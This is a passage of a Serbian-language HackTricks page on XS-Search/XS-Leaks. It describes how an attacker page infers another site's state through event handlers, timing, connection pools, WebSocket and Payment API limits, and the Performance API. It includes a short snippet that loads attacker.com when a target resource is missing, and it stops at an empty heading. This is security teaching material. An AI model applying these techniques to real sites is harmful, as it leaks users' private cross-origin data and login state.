# XS-Search/XS-Leaks

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) za lako kreiranje i **automatizaciju radnih tokova** pokretanih najnaprednijim **alatima zajednice** na svetu.\
Pribavite pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

{% hint style="success" %}
Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podrška HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## Osnovne informacije

XS-Search je metoda koja se koristi za **izvlačenje informacija sa različitih izvora** koristeći **bočne kanale ranjivosti**.

Ključne komponente uključene u ovaj napad uključuju:

* **Ranjivi Web**: Ciljna veb stranica sa koje se informacije nameravaju izvući.
* **Napadačev Web**: Zlonamerna veb stranica koju je kreirao napadač, koju žrtva posećuje, a koja sadrži eksploataciju.
* **Metod uključivanja**: Tehnika koja se koristi za uključivanje Ranjivog Web-a u Napadačev Web (npr. window.open, iframe, fetch, HTML tag sa href, itd.).
* **Tehnika curenja**: Tehnike koje se koriste za uočavanje razlika u stanju Ranjivog Web-a na osnovu informacija prikupljenih putem metode uključivanja.
* **Stanja**: Dva moguća stanja Ranjivog Web-a koja napadač želi da razlikuje.
* **Uočljive razlike**: Opservabilne varijacije na koje se napadač oslanja da bi zaključio stanje Ranjivog Web-a.

### Uočljive razlike

Nekoliko aspekata može se analizirati kako bi se razlikovala stanja Ranjivog Web-a:

* **Status kod**: Razlikovanje između **različitih HTTP status kodova** sa različitih izvora, kao što su greške servera, greške klijenta ili greške autentifikacije.
* **Korišćenje API-ja**: Identifikacija **korišćenja Web API-ja** na stranicama, otkrivajući da li stranica sa različitih izvora koristi određeni JavaScript Web API.
* **Preusmeravanja**: Otkrivanje navigacija ka različitim stranicama, ne samo HTTP preusmeravanjima, već i onima koje pokreće JavaScript ili HTML.
* **Sadržaj stranice**: Posmatranje **varijacija u HTTP odgovoru** ili u podresursima stranice, kao što su **broj ugnježdenih okvira** ili razlike u veličini slika.
* **HTTP zaglavlje**: Zapažanje prisustva ili moguće vrednosti **određenog HTTP odgovora**, uključujući zaglavlja kao što su X-Frame-Options, Content-Disposition i Cross-Origin-Resource-Policy.
* **Vreme**: Uočavanje doslednih vremenskih razlika između dva stanja.

### Metode uključivanja

* **HTML elementi**: HTML nudi različite elemente za **uključivanje resursa sa različitih izvora**, kao što su stilovi, slike ili skripte, primoravajući pregledač da zatraži ne-HTML resurs. Kompilacija potencijalnih HTML elemenata za ovu svrhu može se naći na [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks).
* **Okviri**: Elementi kao što su **iframe**, **object** i **embed** mogu direktno ugraditi HTML resurse u napadačevu stranicu. Ako stranica **nema zaštitu od uokvirivanja**, JavaScript može pristupiti prozoru ugnježdenog resursa putem contentWindow svojstva.
* **Iskočne prozore**: Metoda **`window.open`** otvara resurs u novoj kartici ili prozoru, pružajući **prozor za interakciju** za JavaScript sa metodama i svojstvima prema SOP-u. Iskočni prozori, često korišćeni u jedinstvenom prijavljivanju, zaobilaze ograničenja uokvirivanja i kolačića ciljanog resursa. Međutim, moderni pregledači ograničavaju kreiranje iskočnih prozora na određene korisničke akcije.
* **JavaScript zahtevi**: JavaScript omogućava direktne zahteve ka ciljnim resursima koristeći **XMLHttpRequests** ili **Fetch API**. Ove metode nude preciznu kontrolu nad zahtevom, kao što je opcija da se prati HTTP preusmeravanje.

### Tehnike curenja

* **Handler događaja**: Klasična tehnika curenja u XS-Leaks, gde handleri događaja kao što su **onload** i **onerror** pružaju uvide o uspehu ili neuspehu učitavanja resursa.
* **Poruke o grešci**: JavaScript izuzeci ili posebne stranice sa greškama mogu pružiti informacije o curenju ili direktno iz poruke o grešci ili razlikovanjem između njenog prisustva i odsustva.
* **Globalna ograničenja**: Fizička ograničenja pregledača, kao što su kapacitet memorije ili druga nametnuta ograničenja pregledača, mogu signalizirati kada je dostignut prag, služeći kao tehnika curenja.
* **Globalno stanje**: Uočljive interakcije sa **globalnim stanjima** pregledača (npr. interfejs istorije) mogu se iskoristiti. Na primer, **broj unosa** u istoriji pregledača može pružiti tragove o stranicama sa različitih izvora.
* **Performanse API**: Ovaj API pruža **detalje o performansama trenutne stranice**, uključujući mrežno vreme za dokument i učitane resurse, omogućavajući zaključke o traženim resursima.
* **Čitljiva svojstva**: Neka HTML svojstva su **čitljiva sa različitih izvora** i mogu se koristiti kao tehnika curenja. Na primer, `window.frame.length` svojstvo omogućava JavaScript-u da prebroji okvire uključene u veb stranicu sa različitih izvora.

## XSinator alat i rad

XSinator je automatski alat za **proveru pregledača protiv nekoliko poznatih XS-Leaks** objašnjenih u njegovom radu: [**https://xsinator.com/paper.pdf**](https://xsinator.com/paper.pdf)

Možete **pristupiti alatu na** [**https://xsinator.com/**](https://xsinator.com/)

{% hint style="warning" %}
**Isključeni XS-Leaks**: Morali smo isključiti XS-Leaks koji se oslanjaju na **servisne radnike** jer bi ometali druga curenja u XSinator-u. Pored toga, odlučili smo da **isključimo XS-Leaks koji se oslanjaju na pogrešne konfiguracije i greške u određenoj veb aplikaciji**. Na primer, pogrešne konfiguracije CrossOrigin Resource Sharing (CORS), curenje postMessage ili Cross-Site Scripting. Takođe, isključili smo vremenski zasnovane XS-Leaks jer često pate od sporosti, buke i netačnosti.
{% endhint %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) za lako kreiranje i **automatizaciju radnih tokova** pokretanih najnaprednijim **alatima zajednice** na svetu.\
Pribavite pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## **Tehnike zasnovane na vremenu**

Neke od sledećih tehnika će koristiti vreme kao deo procesa za otkrivanje razlika u mogućim stanjima veb stranica. Postoje različiti načini merenja vremena u veb pregledaču.

**Sati**: [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) API omogućava programerima da dobiju merenja vremena visoke rezolucije.\
Postoji značajan broj API-ja koje napadači mogu zloupotrebiti za kreiranje implicitnih satova: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast\_Channel\_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), CSS animacije i drugi.\
Za više informacija: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## Tehnike handlera događaja

### Onload/Onerror

* **Metode uključivanja**: Okviri, HTML elementi
* **Uočljiva razlika**: Status kod
* **Više informacija**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
* **Sažetak**: Ako pokušavate da učitate resurs, onerror/onload događaji se aktiviraju kada je resurs uspešno/neuspešno učitan, moguće je utvrditi status kod.
* **Primer koda**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="xs-search/cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](xs-search/cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

Primer koda pokušava da **učita skripte iz JS**, ali **drugi tagovi** kao što su objekti, stilovi, slike, audio takođe mogu biti korišćeni. Štaviše, takođe je moguće injektovati **tag direktno** i deklarisati `onload` i `onerror` događaje unutar taga (umesto da ih injektujete iz JS).

Takođe postoji verzija ovog napada bez skripti:
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
U ovom slučaju, ako `example.com/404` nije pronađen, učitaće se `attacker.com/?error`.

### Onload Timing

* **Metode uključivanja**: HTML elementi
* **Uočljiva razlika**: Vreme (generalno zbog sadržaja stranice, status koda)
* **Više informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **Sažetak:** [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API** može se koristiti za merenje koliko vremena je potrebno za izvršenje zahteva. Međutim, mogu se koristiti i drugi satovi, kao što je [**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) koji može identifikovati zadatke koji traju duže od 50ms.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) još jedan primer u:

{% content-ref url="xs-search/performance.now-example.md" %}
[performance.now-example.md](xs-search/performance.now-example.md)
{% endcontent-ref %}

#### Onload Timing + Forced Heavy Task

Ova tehnika je slična prethodnoj, ali **napadač** će takođe **prisiliti** neku akciju da traje **odgovarajuće vreme** kada je **odgovor pozitivan ili negativan** i izmeriti to vreme.

{% content-ref url="xs-search/performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](xs-search/performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### unload/beforeunload Timing

* **Metode uključivanja**: Okviri
* **Uočljiva razlika**: Vreme (generalno zbog sadržaja stranice, status koda)
* **Više informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **Sažetak:** [SharedArrayBuffer sat](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) može se koristiti za merenje koliko vremena je potrebno za izvršenje zahteva. Mogu se koristiti i drugi satovi.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

Vreme potrebno za preuzimanje resursa može se meriti korišćenjem [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload\_event) i [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload\_event) događaja. **`beforeunload`** događaj se aktivira kada se pregledač sprema da pređe na novu stranicu, dok se **`unload`** događaj dešava kada se navigacija zapravo odvija. Razlika u vremenu između ova dva događaja može se izračunati kako bi se odredila **trajanje koje je pregledač potrošio na preuzimanje resursa**.

### Sandboxed Frame Timing + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

* **Metode uključivanja**: Okviri
* **Uočljiva razlika**: Vreme (generalno zbog sadržaja stranice, status koda)
* **Više informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **Sažetak:** [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) API može se koristiti za merenje koliko vremena je potrebno za izvršenje zahteva. Mogu se koristiti i drugi satovi.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

Primećeno je da u odsustvu [Framing Protections](https://xsleaks.dev/docs/defenses/opt-in/xfo/), vreme potrebno za učitavanje stranice i njenih podresursa preko mreže može meriti napadač. Ova merenja su obično moguća jer se `onload` handler iframe-a aktivira tek nakon završetka učitavanja resursa i izvršavanja JavaScript-a. Da bi se zaobišla varijabilnost koju uvodi izvršavanje skripti, napadač može koristiti [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) atribut unutar `<iframe>`. Uključivanje ovog atributa ograničava brojne funkcionalnosti, posebno izvršavanje JavaScript-a, čime se olakšava merenje koje je pretežno pod uticajem mrežne performanse.
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + error + onload

* **Inclusion Methods**: Frames
* **Detectable Difference**: Page Content
* **More info**:
* **Summary**: Ako možete izazvati grešku na stranici kada se pristupi ispravnom sadržaju i učiniti da se učita ispravno kada se pristupi bilo kojem sadržaju, onda možete napraviti petlju za ekstrakciju svih informacija bez merenja vremena.
* **Code Example**:

Pretpostavimo da možete **ubaciti** **stranicu** koja ima **tajni** sadržaj **unutar Iframe**.

Možete **naterati žrtvu da pretražuje** datoteku koja sadrži "_**flag**_" koristeći **Iframe** (na primer, eksploatacijom CSRF). Unutar Iframe-a znate da će se _**onload događaj**_ **izvršiti uvek barem jednom**. Tada možete **promeniti** **URL** **iframe-a** menjajući samo **sadržaj** **hash-a** unutar URL-a.

Na primer:

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.com/xssearch#try2

Ako je prvi URL **uspešno učitan**, tada, kada **promenite** deo **hash-a** URL-a, **onload** događaj **neće biti ponovo aktiviran**. Ali **ako** je stranica imala neku vrstu **greške** prilikom **učitavanja**, tada će se **onload** događaj **ponovo aktivirati**.

Tada možete **razlikovati između** ispravno učitane stranice ili stranice koja ima **grešku** kada se pristupi.

### Javascript Execution

* **Inclusion Methods**: Frames
* **Detectable Difference**: Page Content
* **More info**:
* **Summary:** Ako **stranica** **vraća** **osetljive** sadržaje, **ili** sadržaj koji može biti **kontrolisan** od strane korisnika. Korisnik može postaviti **validan JS kod u negativnom slučaju**, **učitavajući** svaki pokušaj unutar **`<script>`** tagova, tako da u **negativnim** slučajevima **napadačev kod** se **izvršava**, a u **afirmativnim** slučajevima **ništa** neće biti izvršeno.
* **Code Example:**

{% content-ref url="xs-search/javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](xs-search/javascript-execution-xs-leak.md)
{% endcontent-ref %}

### CORB - Onerror

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Status Code & Headers
* **More info**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **Summary**: **Cross-Origin Read Blocking (CORB)** je bezbednosna mera koja sprečava web stranice da učitavaju određene osetljive resurse sa drugih domena kako bi se zaštitili od napada poput **Spectre**. Međutim, napadači mogu iskoristiti njeno zaštitno ponašanje. Kada odgovor podložan **CORB** vrati _**CORB zaštićen**_ `Content-Type` sa `nosniff` i `2xx` status kodom, **CORB** uklanja telo i zaglavlja odgovora. Napadači koji to posmatraju mogu da zaključe kombinaciju **status koda** (koji ukazuje na uspeh ili grešku) i `Content-Type` (koji označava da li je zaštićen od **CORB**), što može dovesti do potencijalnog curenja informacija.
* **Code Example**:

Proverite link za više informacija o napadu.

### onblur

* **Inclusion Methods**: Frames
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
* **Summary**: Curenje osetljivih podataka iz id ili name atributa.
* **Code Example**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

Moguće je **učitati stranicu** unutar **iframe-a** i koristiti **`#id_value`** da se stranica **fokusira na element** iframe-a sa naznačenim id, zatim, ako se aktivira **`onblur`** signal, ID element postoji.\
Možete izvršiti isti napad sa **`portal`** tagovima.

### postMessage Broadcasts <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: API Usage
* **More info**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
* **Summary**: Prikupiti osetljive informacije iz postMessage ili koristiti prisustvo postMessages kao orakl za poznavanje statusa korisnika na stranici
* **Code Example**: `Any code listening for all postMessages.`

Aplikacije često koriste [`postMessage` broadcasts](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) za komunikaciju između različitih domena. Međutim, ova metoda može nenamerno izložiti **osetljive informacije** ako parametar `targetOrigin` nije pravilno specificiran, omogućavajući bilo kojem prozoru da primi poruke. Štaviše, sam čin primanja poruke može delovati kao **orakl**; na primer, određene poruke mogu biti poslate samo korisnicima koji su prijavljeni. Stoga, prisustvo ili odsustvo ovih poruka može otkriti informacije o stanju ili identitetu korisnika, kao što je da li su autentifikovani ili ne.

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da lako izgradite i **automatizujete radne tokove** pokretane najnaprednijim **alatima** zajednice.\
Pribavite pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Global Limits Techniques

### WebSocket API

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: API Usage
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Summary**: Iscrpljivanje limita WebSocket konekcije otkriva broj WebSocket konekcija stranice sa drugog domena.
* **Code Example**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(FF\)), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(GC\))

Moguće je identifikovati da li, i koliko, **WebSocket konekcija koristi ciljana stranica**. To omogućava napadaču da detektuje stanja aplikacije i otkrije informacije vezane za broj WebSocket konekcija.

Ako jedan **domen** koristi **maksimalan broj WebSocket** objekata konekcije, bez obzira na stanje njihovih konekcija, kreiranje **novih objekata će rezultirati JavaScript izuzecima**. Da bi izvršio ovaj napad, napadačev sajt otvara ciljani sajt u iskačućem prozoru ili iframe-u, a zatim, nakon što se ciljana web stranica učita, pokušava da kreira maksimalan broj WebSocket konekcija. **Broj izbačenih izuzetaka** je **broj WebSocket konekcija koje koristi ciljana web stranica**.

### Payment API

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: API Usage
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Summary**: Detektovanje Payment Request jer samo jedan može biti aktivan u isto vreme.
* **Code Example**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

Ova XS-Curenje omogućava napadaču da **detektuje kada stranica sa drugog domena inicira zahtev za plaćanje**.

Pošto **samo jedan zahtev za plaćanje može biti aktivan** u isto vreme, ako ciljana web stranica koristi Payment Request API, svaki dalji pokušaj korišćenja ovog API-ja će propasti i izazvati **JavaScript izuzetak**. Napadač može iskoristiti ovo tako što će **periodično pokušavati da prikaže UI Payment API**. Ako jedan pokušaj izazove izuzetak, ciljana web stranica ga trenutno koristi. Napadač može sakriti ove periodične pokušaje tako što će odmah zatvoriti UI nakon kreiranja.

### Timing the Event Loop <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

* **Inclusion Methods**:
* **Detectable Difference**: Timing (generalno zbog sadržaja stranice, status koda)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
* **Summary:** Merenje vremena izvršenja web-a zloupotrebljavajući jednonitni JS event loop.
* **Code Example**:

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

JavaScript funkcioniše na [jednonitnom event loop](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop) modelu konkurencije, što znači da **može izvršiti samo jedan zadatak u isto vreme**. Ova karakteristika se može iskoristiti za merenje **koliko dugo kod sa drugog domena traje da se izvrši**. Napadač može meriti vreme izvršenja svog koda u event loop-u kontinuiranim slanjem događaja sa fiksnim svojstvima. Ovi događaji će biti obrađeni kada je event pool prazan. Ako drugi domeni takođe šalju događaje u isti pool, **napadač može da zaključi vreme koje je potrebno za izvršavanje ovih spoljašnjih događaja posmatrajući kašnjenja u izvršenju svojih zadataka**. Ova metoda praćenja event loop-a za kašnjenja može otkriti vreme izvršenja koda sa različitih domena, potencijalno izlažući osetljive informacije.

{% hint style="warning" %}
U merenju vremena izvršenja moguće je **eliminisati** **mrežne faktore** kako bi se dobile **preciznije merenja**. Na primer, učitavanjem resursa koji se koriste na stranici pre njenog učitavanja.
{% endhint %}

### Busy Event Loop <a href="#busy-event-loop" id="busy-event-loop"></a>

* **Inclusion Methods**:
* **Detectable Difference**: Timing (generalno zbog sadržaja stranice, status koda)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
* **Summary:** Jedna metoda za merenje vremena izvršenja web operacije uključuje namerno blokiranje event loop-a niti i zatim merenje **koliko dugo je potrebno da event loop ponovo postane dostupan**. Umetanjem blokirajuće operacije (kao što je dugačka računica ili sinhroni API poziv) u event loop, i praćenjem vremena koje je potrebno da započnu izvršenje naredni kod, može se zaključiti trajanje zadataka koji su se izvršavali u event loop-u tokom blokirajućeg perioda. Ova tehnika koristi jednonitnu prirodu JavaScript-ovog event loop-a, gde se zadaci izvršavaju sekvencijalno, i može pružiti uvide u performanse ili ponašanje drugih operacija koje dele istu nit.
* **Code Example**:

Značajna prednost tehnike merenja vremena izvršenja blokiranjem event loop-a je njena potencijalna sposobnost da zaobiđe **Site Isolation**. **Site Isolation** je bezbednosna funkcija koja razdvaja različite web stranice u odvojene procese, s ciljem da spreči zlonamerne sajtove da direktno pristupaju osetljivim podacima sa drugih sajtova. Međutim, utičući na vreme izvršenja drugog domena kroz zajednički event loop, napadač može indirektno izvući informacije o aktivnostima tog domena. Ova metoda ne zavisi od direktnog pristupa podacima drugog domena, već posmatra uticaj aktivnosti tog domena na zajednički event loop, čime se izbegavaju zaštitne barijere koje postavlja **Site Isolation**.

{% hint style="warning" %}
U merenju vremena izvršenja moguće je **eliminisati** **mrežne faktore** kako bi se dobila **preciznija merenja**. Na primer, učitavanjem resursa koji se koriste na stranici pre njenog učitavanja.
{% endhint %}

### Connection Pool

* **Inclusion Methods**: JavaScript Requests
* **Detectable Difference**: Timing (generalno zbog sadržaja stranice, status koda)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
* **Summary:** Napadač može zaključati sve sokete osim 1, učitati ciljani web i u isto vreme učitati drugu stranicu, vreme do kada se poslednja stranica počinje učitavati je vreme koje je ciljana stranica uzela da se učita.
* **Code Example**:

{% content-ref url="xs-search/connection-pool-example.md" %}
[connection-pool-example.md](xs-search/connection-pool-example.md)
{% endcontent-ref %}

Pregledači koriste sokete za komunikaciju sa serverom, ali zbog ograničenih resursa operativnog sistema i hardvera, **pregledači su primorani da postave limit** na broj istovremenih soketa. Napadači mogu iskoristiti ovo ograničenje kroz sledeće korake:

1. Utvrditi limit soketa pregledača, na primer, 256 globalnih soketa.
2. Zauzeti 255 soketa na duži period pokretanjem 255 zahteva ka različitim hostovima, dizajniranim da drže konekcije otvorenim bez završavanja.
3. Iskoristiti 256. soket za slanje zahteva ka ciljanom sajtu.
4. Pokušati 257. zahtev ka drugom hostu. S obzirom na to da su svi soketi u upotrebi (prema koracima 2 i 3), ovaj zahtev će biti u redu dok ne postane dostupan soket. Kašnjenje pre nego što ovaj zahtev prođe daje napadaču informaciju o vremenu mrežne aktivnosti vezane za 256. soket (soket ciljanog sajta). Ova inferencija je moguća jer je 255 soketa iz koraka 2 još uvek angažovano, što implicira da bilo koji novodostupni soket mora biti onaj oslobođen iz koraka 3. Vreme koje je potrebno da 256. soket postane dostupan je tako direktno povezano sa vremenom potrebnim da zahtev ka ciljanom sajtu završi.

Za više informacija: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)

### Connection Pool by Destination

* **Inclusion Methods**: JavaScript Requests
* **Detectable Difference**: Timing (generalno zbog sadržaja stranice, status koda)
* **More info**:
* **Summary:** Slično prethodnoj tehnici, ali umesto korišćenja svih soketa, Google **Chrome** postavlja limit od **6 istovremenih zahteva ka istom domenu**. Ako **blokiramo 5** i zatim **pokrenemo 6.** zahtev, možemo **izmeriti** vreme, a ako uspemo da nateramo **stranicu žrtve da pošalje** više **zahteva** ka istom kraju da detektujemo **status** **stranice**, **6. zahtev** će trajati **duže** i možemo to detektovati.

## Performance API Techniques

[`Performance API`](https://developer.mozilla.org/en-US/docs/Web/API/Performance) nudi uvide u performanse web aplikacija, dodatno obogaćene [`Resource Timing API`](https://developer.mozilla.org/en-US/docs/Web/API/Resource\_Timing\_API). Resource Timing API omogućava praćenje detaljnih vremena mrežnih zahteva, kao što je trajanje zahteva. Značajno je da kada serveri uključuju `Timing-Allow-Origin: *` zaglavlje u svojim odgovorima, dodatni podaci poput veličine prenosa i vremena pretrage domena postaju dostupni.

Ova bogatstvo podataka može se dobiti putem metoda kao što su [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) ili [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName), pružajući sveobuhvatan pregled informacija vezanih za performanse. Pored toga, API olakšava merenje vremena izvršenja izračunavanjem razlike između vremenskih oznaka dobijenih iz [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now). Međutim, vredi napomenuti da za određene operacije u pregledačima poput Chrome-a, preciznost `performance.now()` može biti ograničena na milisekunde, što može uticati na granularnost merenja vremena.

Pored merenja vremena, Performance API se može iskoristiti za uvide vezane za bezbednost. Na primer, prisustvo ili odsustvo stranica u `performance` objektu u Chrome-u može ukazivati na primenu `X-Frame-Options`. Konkretno, ako je stranica blokirana od renderovanja u okviru zbog `X-Frame-Options`, ona neće biti zabeležena u `performance` objektu, pružajući suptilan trag o politikama uokvirivanja stranice.

### Error Leak

* **Inclusion Methods**: Frames, HTML Elements
* **Detectable Difference**: Status Code
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Zahtev koji rezultira greškama neće kreirati unos vremena resursa.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

Moguće je **razlikovati između HTTP status kodova** jer zahtevi koji dovode do **greške** ne **kreiraju unos performansi**.

### Style Reload Error

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Status Code
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Zbog greške u pregledaču, zahtevi koji rezultiraju greškama se učitavaju dvaput.
* **Code Example**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

U prethodnoj tehnici takođe su identifikovana dva slučaja gde greške u GC dovode do **učitavanja resursa dvaput kada ne uspeju da se učitaju**. To će rezultirati višestrukim unosima u Performance API i tako se može detektovati.

### Request Merging Error

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Status Code
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Zahtevi koji rezultiraju greškom ne mogu se spojiti.
* **Code Example**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

Tehnika je pronađena u tabeli u pomenutom radu, ali nije pronađen opis tehnike. Međutim, možete pronaći izvorni kod koji to proverava na [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

### Empty Page Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Page Content
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Prazni odgovori ne kreiraju unose vremena resursa.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

Napadač može detektovati da li je zahtev rezultirao praznim HTTP odgovorom jer **prazne stranice ne kreiraju unos performansi u nekim pregledačima**.

### **XSS-Auditor Leak**

